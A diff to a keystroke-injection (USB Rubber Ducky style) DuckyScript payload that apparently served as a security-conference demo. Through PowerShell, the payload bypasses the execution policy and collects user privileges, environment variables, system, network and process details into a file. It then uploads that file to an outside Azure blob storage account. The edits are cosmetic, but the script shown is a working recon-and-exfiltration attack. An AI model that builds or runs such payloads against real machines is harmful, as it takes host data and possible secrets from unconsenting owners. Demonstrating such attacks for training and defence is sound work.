@@ -1,12 +1,12 @@
 GUI r
 DELAY 500
-STRING powershell
+STRING pwsh
 ENTER
 DELAY 1000
 STRING Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
 ENTER
 DELAY 1000
-STRING echo HELLO HELLO HELLO
+STRING Write-Host "HELLO HELLO HELLO"
 ENTER
 DELAY 1000
 STRING $storageAccount = "bsides2025"; $storageKey = "KEYGOESHERE"; $containerName = "files"; $fileName = "system_context_verbose.txt"; "=== DETAILED SYSTEM CONTEXT ===" > $fileName; "Generated: $(Get-Date)" >> $fileName; whoami /all >> $fileName; "=== LOCATION ===" >> $fileName; Get-Location >> $fileName; Get-ChildItem -Force >> $fileName; "=== ENVIRONMENT ===" >> $fileName; Get-ChildItem Env: >> $fileName; "=== SYSTEM INFO ===" >> $fileName; systeminfo >> $fileName; "=== NETWORK ===" >> $fileName; ipconfig /all >> $fileName; "=== PROCESSES ===" >> $fileName; Get-Process | Select-Object Name,Id,CPU >> $fileName;
@@ -33,7 +33,7 @@ DELAY 500
 STRING $uri = "https://$storageAccount.blob.core.windows.net/$containerName/$fileName"; $headers = @{ 'x-ms-date' = $date; 'x-ms-version' = '2020-04-08'; 'x-ms-blob-type' = 'BlockBlob'; 'Authorization' = $authorization; 'Content-Type' = 'application/octet-stream' }
 ENTER
 DELAY 500
-STRING Invoke-RestMethod -Uri $uri -Method PUT -Body $fileBytes -Headers $headers
+STRING Invoke-RestMethod -Uri $uri -Method Put -Body $fileBytes -Headers $headers
 ENTER
 DELAY 1000
 STRING Write-Host "File uploaded successfully to: $uri"
